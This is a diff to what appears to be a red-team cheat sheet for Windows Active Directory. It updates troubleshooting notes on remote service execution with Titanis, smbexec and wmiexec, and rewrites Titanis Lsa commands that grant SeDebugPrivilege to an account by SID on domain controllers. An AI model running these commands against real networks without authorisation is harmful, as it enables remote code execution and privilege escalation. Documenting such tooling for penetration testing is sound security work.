@@ -185,7 +185,7 @@ netexec smb 192.168.1.10 -u jdoe -p Password123 -x "whoami" --exec-method dcomex
 
 ### Service-Based Exec (smbexec / psexec)
 
-> **⚠️ Titanis `Scm` status:** All `Scm` subcommands (`create`, `start`, `stop`, `delete`, `query`) are currently non-functional. Use `smbexec.py`, `psexec.py`, or Metasploit for service-based execution.
+> **⚠️ Titanis `Scm` status:** All `Scm` subcommands are non-functional. Diagnostic tracing confirms Titanis hardcodes `auth context <none> with level None` for the SVCCTL RPC bind — no flag combination fixes this (`-EncryptRpc`, `-PreferSmb`, `-Spnego`, Kerberos all fail with the same `0x1C010002` fault). Needs a Titanis code fix. Use `smbexec.py`, `psexec.py`, or Metasploit for service-based execution.
 
 > **⚠️ `smbexec.py` against DCs:** smbexec uses SVCCTL to create a temporary service. Domain Controllers enforce `PacketPrivacy` authentication level on SVCCTL, which impacket does not negotiate — service creation fails with `STATUS_OBJECT_NAME_NOT_FOUND`. This is the same root cause as `secretsdump -use-vss` failures. `smbexec.py` works normally against member servers. Use `wmiexec.py` for DC targets.
 
@@ -1725,7 +1725,7 @@ Reg setsd 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
 
 ### Service Enumeration
 
-> **⚠️ Titanis `Scm` status:** All `Scm` subcommands are currently non-functional. Use `services.py`, `netexec --services`, or `aiosmb` instead.
+> **⚠️ Titanis `Scm` status:** All `Scm` subcommands are non-functional. Diagnostic tracing confirms Titanis hardcodes `auth context <none> with level None` for the SVCCTL RPC bind regardless of flags. Needs a Titanis code fix. Use `services.py` (impacket) or `netexec smb --services` instead.
 
 ```bash
 # impacket
@@ -1767,9 +1767,23 @@ rpcclient -U 'DOMAIN\jdoe%Password123' 192.168.1.10 \
 # bloodyAD — no userRight subcommand; use rpcclient or Titanis for LSA privilege assignment
 
 # Titanis
-Lsa addpriv      192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe SeDebugPrivilege
-Lsa rmpriv       192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe SeDebugPrivilege
-Lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 -ByName jdoe 0x20
+# ⚠️ Three requirements:
+#   1. -PreferSmb required when targeting Domain Controllers (not needed for member servers)
+#   2. -BySid required; -ByName is broken (LsaLookupNames always returns STATUS_OBJECT_NAME_NOT_FOUND)
+#   3. Target account must have an existing LSA policy entry — run createaccount first if not
+#
+# Get SID first (impacket): lookupsid.py 'DOMAIN/admin:Pass@dc-ip' | grep <username>
+#
+# Step 1 — create LSA account entry if target has no existing explicit rights
+Lsa createaccount 192.168.1.10 S-1-5-21-...-1001 \
+  -UserName jdoe@DOMAIN -Password Password123 -PreferSmb
+# Step 2 — add/remove privilege
+Lsa addpriv  192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+  -BySid S-1-5-21-...-1001 SeDebugPrivilege -PreferSmb
+Lsa rmpriv   192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+  -BySid S-1-5-21-...-1001 SeDebugPrivilege -PreferSmb
+Lsa setsysaccess 192.168.1.10 -UserName jdoe@DOMAIN -Password Password123 \
+  -BySid S-1-5-21-...-1001 0x20 -PreferSmb
 ```
 
 [↑ Back to Index](#index)
